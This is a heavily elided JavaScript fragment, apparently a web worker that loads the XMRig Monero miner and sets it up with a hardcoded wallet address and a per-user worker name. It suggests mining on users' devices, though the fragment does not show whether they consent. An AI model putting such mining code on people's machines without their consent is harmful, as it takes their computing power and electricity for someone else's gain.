// ============================================================
// CHIMERA WORKER – REAL MONERO MINING (FINAL)
// ============================================================
...
async function loadXMRig() {
  try {
    // CDN version – replace with your own hosted file later
  ...
  if (XMRig) {
    try {
      miner = new XMRig({
        ...
        wallet: '46an3rRwAENNVnZhXuxMYKDFAfTP5sasbdDcpTQZRezpGfsJ8ZAoGWWTXyZBk5vLRk8z2LHQGfNthdC93dAD1uxAP9T9gA2', // Replace with your wallet
        password: 'x',
        worker: `user_${userId}`,
        threads: 1,
      });
